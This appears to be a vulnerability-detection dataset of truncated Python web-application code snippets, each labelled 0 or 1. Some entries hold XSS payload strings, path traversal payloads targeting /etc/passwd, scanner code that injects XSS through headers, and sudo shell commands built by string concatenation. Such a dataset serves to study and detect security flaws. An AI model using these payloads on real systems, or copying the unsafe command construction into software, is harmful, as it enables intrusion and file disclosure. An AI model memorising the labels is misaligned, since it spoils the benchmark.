ignored for oob commands. Use command arguments(which can hold dicts) to", "label": 0}, {"snippet_id": 53433, "code": " else: bundle_doc=Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc", "label": 0}, {"snippet_id": 29353, "code": "\t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path') +\" && sudo \" +sql.get_setting('restart_command')]\t \t\tif sql.get_setting('firewall_enable", "label": 0}, {"snippet_id": 29608, "code": "=1: \t\t\treturn stderr.read().decode(encoding='UTF-8') \t\telse: \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\t\t \t\tfor line in stderr.read().decode(encoding='UTF-8'): \t\t\tif line: \t\t\t\tprint(\"<div class=", "label": 0}, {"snippet_id": 52195, "code": " request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(id=job['id']) doc=doc2.doc.get() doc.can_write_or_exception(request.user) doc.delete() doc2", "label": 0}, {"snippet_id": 33172, "code": ".cron_update_buckets() class BuildRPCHandler(webapp2.RequestHandler): \"\"\"Redirects to API explorer to see the build.\"\"\" def get(self, build_id): api_path='/_ah/api/buildbucket/v1/builds/%s' % build_id return self", "label": 0}, {"snippet_id": 8258, "code": "'openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views", "label": 0}, {"snippet_id": 15013, "code": ".setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected", "label": 0}, {"snippet_id": 47680, "code": "=False)) f.add_content(PlainText('Confirm your password: ')) f.add_content(PasswordField(name='confirm_password', required=False)) f.add_content(PlainText(get_csrf_form_element(http_request))) f.add_content", "label": 0}, {"snippet_id": 5053, "code": "<input autofocus>', '<video><source onerror=\"alert(1)\">', '<video onerror=\"alert(1)\"><source></source></video>', '<form><button formaction=\"javascript:alert(1)\">X</button>', '<math href=\"javascript:alert", "label": 0}, {"snippet_id": 46585, "code": "'id'] for collection in collections]) } return JsonResponse(response) def admin_collection_copy(request): if request.method !='POST': raise PopupException(_('POST request required.')) collections=json.loads", "label": 0}, {"snippet_id": 4111, "code": "\"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param", "label": 0}, {"snippet_id": 9016, "code": "), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$", "label": 0}, {"snippet_id": 37043, "code": ".blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name", "label": 0}, {"snippet_id": 2755, "code": "'%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url==''", "label": 0}, {"snippet_id": 1463, "code": ".append('../') from flask import Flask,render_template from flask import Response,make_response from flask import request from flask import Flask from apiscan import scan_single_api from flask import jsonify", "label": 1}, {"snippet_id": 38248, "code": " def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe", "label": 0}, {"snippet_id": 5375, "code": "', 'ul', 'var', 'video', 'wbr', 'xmp', ] _events=[ 'onabort', 'onautocomplete', 'onautocompleteerror', 'onafterscriptexecute', 'onanimationend', 'onanimationiteration', 'onanimationstart', 'onbeforecopy", "label": 0}, {"snippet_id": 5137, "code": "/script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate", "label": 0}, {"snippet_id": 52268, "code": ".get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc.all().delete() doc2.doc.add(copy_doc) workflow", "label": 0}, {"snippet_id": 22559, "code": "(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki", "label": 0}, {"snippet_id": 28689, "code": " % ref) \t\t\t\t def is_admin(**kwargs): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid') \ttry: \t\trole=sql.get_user_role_by_uuid", "label": 0}, {"snippet_id": 18838, "code": " settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):", "label": 0}, {"snippet_id": 17846, "code": "'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile", "label": 0}, {"snippet_id": 27713, "code": "._add_security_response_headers() self.response.headers['Content-Type']='text/html' self.response.out.write(template.render(values)) self.response.set_status(status) def before_render_json(self, values, status): \"\"\"A", "label": 0}, {"snippet_id": 30293, "code": "=headers, data=postdata, auth=(haproxy_user, haproxy_pass)) \t if serv is not None and act==\"stats\": \timport requests \tfrom requests_toolbelt.utils import dump \t \thaproxy_user=sql.get_setting('stats_user') ", "label": 0}, {"snippet_id": 50863, "code": "*kwargs): kwargs[\"options\"].update({\"send_prompt\": True}) self.send_text(*args, **kwargs) def send_default(self, cmdname, *args, **kwargs): \"\"\" Data Evennia -> User. Args: cmdname(str): The first argument", "label": 0}, {"snippet_id": 49890, "code": "{{ bitcoin_address}}\", \"donate to us via paypal at:{{ paypal_address}}\", \"donate to us via venmo at:{{ venmo_address}}\", \"donate to us via beemit at:{{ beemit_address}}\", ] return render_template(\"chatbot", "label": 1}, {"snippet_id": 40122, "code": " self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3", "label": 0}, {"snippet_id": 54569, "code": "]=self.object.article_set.all() context['form']=CommentForm() return context class RegisterFormView(FormView): \"\"\"\u6ce8\u518c\u9875\u9762\u3002\u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u521b\u5efa\u7528\u6237\u8868\u5355\u3002\"\"\" template_name='register.html' form_class=UserCreationForm success_url", "label": 0}, {"snippet_id": 51605, "code": "'dev':{ 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, 'test':{ 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, ", "label": 0}, {"snippet_id": 30348, "code": "'Oops. Read timeout occured') \texcept requests.exceptions.HTTPError as errh: \t\tprint(\"Http Error:\",errh) \texcept requests.exceptions.ConnectionError as errc: \t\tprint('<div class=\"alert alert-danger\">Error", "label": 0}, {"snippet_id": 41024, "code": "=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t", "label": 0}, {"snippet_id": 35014, "code": "\t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self", "label": 0}, {"snippet_id": 2686, "code": ".api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print", "label": 0}, {"snippet_id": 8802, "code": ".views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views", "label": 0}, {"snippet_id": 43492, "code": " and not self.is_dummy_password(new_password): \t\t\t\t \t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password", "label": 0}, {"snippet_id": 39791, "code": "\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch", "label": 0}, {"snippet_id": 51486, "code": " 'django_otp.plugins.otp_totp', 'two_factor', ] try: if not os.environ.get('COMPRESS', False): import django_uwsgi INSTALLED_APPS +=['django_uwsgi',] except ImportError: pass MIDDLEWARE=[ 'django.middleware", "label": 0}, {"snippet_id": 53682, "code": "(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting bundle %s\") %(bundle,), detail", "label": 0}, {"snippet_id": 14544, "code": " patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd", "label": 0}, {"snippet_id": 46279, "code": "=engine) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': query, 'initial':", "label": 0}, {"snippet_id": 20373, "code": " Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get", "label": 0}, {"snippet_id": 40925, "code": " __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import", "label": 1}, {"snippet_id": 10801, "code": "'VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self", "label": 1}, {"snippet_id": 41791, "code": ".dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None)", "label": 0}, {"snippet_id": 20170, "code": ".imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root", "label": 0}, {"snippet_id": 34327, "code": "(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype", "label": 0}, {"snippet_id": 51927, "code": ":{ 'import_data_dir': '', }, } OUTPUT_DIR=os.environ.get('OUTPUT_DIR', os.path.abspath(os.path.dirname(__file__)) +'/') VENDOR_DIR=os.environ.get('VENDOR_DIR', os.path.abspath(os.path.dirname(__file__)", "label": 0}, {"snippet_id": 34313, "code": " isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None", "label": 0}, {"snippet_id": 27310, "code": " standard_library standard_library.install_aliases() import base64 import cgi import datetime import json import logging import os import re import sys import traceback import urllib.parse import jinja2", "label": 0}, {"snippet_id": 48230, "code": " GroupReservation, ArticleRequested, Article, ArticleGroup, SubReservation from.magic import get_current_user import json import datetime RESERVATION_CONSTRUCTION_COOKIE_KEY: str=\"org.technikradio.c3shop", "label": 0}, {"snippet_id": 16026, "code": " django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib", "label": 0}, {"snippet_id": 27801, "code": "=exception.status values=exception.to_dict() values['params']=self.request.params.dict_of_lists() if status >=400 and status <=499: logging.info(json.dumps(values, cls=JsonEncoder)) del values['traceDump'", "label": 0}, {"snippet_id": 15457, "code": ".run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in", "label": 0}, {"snippet_id": 35584, "code": " \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test", "label": 0}, {"snippet_id": 7472, "code": "?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$", "label": 0}, {"snippet_id": 6796, "code": " logins etc.) MongoDB connection URI(string). See MongoDB documentation for details. If not set, Kantara authn logs will not be maintained. \"\"\" return self.config.get(self.section, 'authn_info_mongo_uri", "label": 0}, {"snippet_id": 11325, "code": "(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\",", "label": 0}, {"snippet_id": 9436, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 46051, "code": " collection_doc.doc.get().can_read_or_exception(request.user) collection=Collection2(request.user, document=collection_doc) except Exception, e: raise PopupException(e, title=_(\"Dashboard does not exist or you don", "label": 0}, {"snippet_id": 2240, "code": ",headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result", "label": 0}, {"snippet_id": 6090, "code": "'max_authn_failures_per_month': '50', 'login_state_ttl': '5', 'default_scoped_affiliation': None, 'vccs_url': 'http://localhost:8550/', 'insecure_cookies': '0', } _CONFIG_SECTION='eduid_idp' class IdPConfig(object): \"\"\" Class", "label": 0}, {"snippet_id": 36886, "code": ".blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe", "label": 1}, {"snippet_id": 43672, "code": ".meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) ", "label": 0}, {"snippet_id": 33664, "code": ".comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text", "label": 0}, {"snippet_id": 19173, "code": "--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '',", "label": 0}, {"snippet_id": 49427, "code": " object_list): self.model=model if isinstance(field, SmartListFilter): self.field_name=field.parameter_name self.model_field=field else: self.field_name=field self.model_field=self.model._meta.get_field", "label": 0}, {"snippet_id": 15241, "code": " environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to", "label": 0}, {"snippet_id": 21438, "code": "/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views", "label": 0}, {"snippet_id": 22598, "code": "'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki", "label": 0}, {"snippet_id": 8108, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url", "label": 0}, {"snippet_id": 45900, "code": " from django.core.urlresolvers import reverse from desktop.conf import USE_NEW_EDITOR from desktop.lib.django_util import JsonResponse, render from desktop.lib.exceptions_renderable import PopupException", "label": 0}, {"snippet_id": 3021, "code": "='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers", "label": 0}, {"snippet_id": 28175, "code": "'config') +\".cfg\" if serv is not None and form.getvalue('open') is not None: \t \ttry: \t\tfunct.logging(serv, \"config.py open config\") \texcept: \t\tpass \t \terror=funct.get_config(serv, cfg) \t \ttry: \t\tconf=open", "label": 0}, {"snippet_id": 5842, "code": "(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for", "label": 0}, {"snippet_id": 49277, "code": "=render_function self.order_field=None self.order=None if not self.field_name: return if self.field_name.startswith(\"_\") and self.field_name !=\"__str__\": raise SmartListException(\"Cannot use underscore(_) variables", "label": 0}, {"snippet_id": 43479, "code": "\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password and not self.is_dummy_password(new_password):", "label": 0}, {"snippet_id": 23803, "code": "(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual", "label": 0}, {"snippet_id": 39628, "code": ")) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname", "label": 0}, {"snippet_id": 26571, "code": "../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00', '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "label": 0}, {"snippet_id": 7718, "code": ".html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$'", "label": 1}, {"snippet_id": 40151, "code": "\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype", "label": 0}, {"snippet_id": 44963, "code": " params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request.info", "label": 0}, {"snippet_id": 35093, "code": "[\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: ", "label": 0}, {"snippet_id": 2678, "code": " referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss", "label": 0}, {"snippet_id": 11902, "code": " if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings", "label": 0}, {"snippet_id": 28021, "code": " SessionLoginHandler(base_handler.Handler): \"\"\"Session login handler.\"\"\" @handler.post(handler.JSON, handler.JSON) def post(self): \"\"\"Handle a post request.\"\"\" id_token=self.request.get('idToken') expires_in", "label": 0}, {"snippet_id": 38068, "code": ".category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(", "label": 0}, {"snippet_id": 21741, "code": " urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(", "label": 0}, {"snippet_id": 50435, "code": " available. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) dataentries=self.databuffer.get(csessid,[]) if dataentries:", "label": 0}, {"snippet_id": 39137, "code": "\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in", "label": 0}, {"snippet_id": 42082, "code": "): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname", "label": 0}, {"snippet_id": 53610, "code": ".objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])]) for i, bundled in enumerate(bundle.data['coordinators']): coord=coords[bundled['coordinator']", "label": 0}, {"snippet_id": 46811, "code": ".IntField(default=0) kind=K_COMMENT class Meta: table='comments' async def set_content(self, content): return await self.set_props_by_key('content', content) async def save(self, *args, **kwargs): content", "label": 0}, {"snippet_id": 11232, "code": " test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd", "label": 0}, {"snippet_id": 30892, "code": " if serv is not None and act==\"configShow\": \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') \t \tif form.getvalue('configver') is None:\t \t\tcfg=hap_configs_dir +serv +\"-\" +funct", "label": 0}, {"snippet_id": 23432, "code": "/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login", "label": 0}, {"snippet_id": 28575, "code": "/center>' % e) \t\tpass \t def telegram_send_mess(mess, **kwargs): \timport telebot \tfrom telebot import apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip(kwargs.get('ip')) \tproxy=sql.get_setting('proxy", "label": 0}, {"snippet_id": 45559, "code": " coordinators=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako'", "label": 0}, {"snippet_id": 33814, "code": ", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context", "label": 0}, {"snippet_id": 36974, "code": " by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def", "label": 0}, {"snippet_id": 3326, "code": "!=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11", "label": 0}, {"snippet_id": 17511, "code": ".urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +", "label": 0}, {"snippet_id": 31867, "code": " servers: \t\tfunct.ssh_command(server[2],[\"sudo mkdir \"+path]) \t\terror=funct.upload(server[2], path+\"/\"+form.getvalue('bwlists_save'), list, dir='fullpath') \t\tif error: \t\t\tprint('<div class=\"alert alert-danger", "label": 0}, {"snippet_id": 29157, "code": " \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+script +\" PROXY=\" +proxy+ \t\t\t\t\" HAPROXY_PATH=\"+haproxy_dir +\" VERSION=\"+ver] \t \terror=str(upload(serv, tmp_config_path, script", "label": 0}, {"snippet_id": 21032, "code": " name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls", "label": 0}, {"snippet_id": 4075, "code": "\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1", "label": 0}, {"snippet_id": 51582, "code": "'mysql':{'init_command': \"SET character_set_connection=utf8,\" \"collation_connection=utf8_unicode_ci,\" \"sql_mode='STRICT_ALL_TABLES';\"}, } DB_ENGINE=os.environ.get('DB_ENGINE', 'mysql') DATABASE_ENGINES", "label": 0}, {"snippet_id": 30732, "code": " state\" | sudo socat stdio %s > %s' %(haproxy_sock, server_state_file) \t\tcommand=[ cmd, save_command] \telse: \t\tcommand=[ cmd] \t\t \tif enable !=\"show\": \t\tprint('<center><h3>You %s %s on HAproxy %s. <a href=", "label": 0}, {"snippet_id": 35339, "code": " \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname", "label": 0}, {"snippet_id": 22231, "code": "'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]", "label": 0}, {"snippet_id": 40741, "code": " not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest", "label": 0}, {"snippet_id": 55057, "code": ".BatchActionsForm`. \"\"\" form=forms.BatchActionsForm(request.POST) if not form.is_valid(): return HttpResponseBadRequest(form.errors.as_json()) locale=get_object_or_404(Locale, code=form.cleaned_data['locale']", "label": 1}, {"snippet_id": 29573, "code": "\"show_log\")==\"1\": \t\t\tshow_log(stdout) \t\telif kwargs.get(\"server_status\")==\"1\": \t\t\tserver_status(stdout) \t\telif kwargs.get('print_out'): \t\t\tprint(stdout.read().decode(encoding='UTF-8')) \t\t\treturn stdout", "label": 0}, {"snippet_id": 1358, "code": "'name': data['name'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': data['Description'], 'remediation", "label": 0}, {"snippet_id": 40363, "code": "'fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password", "label": 0}, {"snippet_id": 6164, "code": " self.config=ConfigParser.ConfigParser(_CONFIG_DEFAULTS) if not self.config.read([filename]): raise ValueError(\"Failed loading config file{!r}\".format(filename)) @property def num_threads(self): \"\"\" Number", "label": 0}, {"snippet_id": 9024, "code": " url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r", "label": 0}, {"snippet_id": 24194, "code": ".start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file,", "label": 0}, {"snippet_id": 30636, "code": ") \thour1=form.getvalue('hour1') 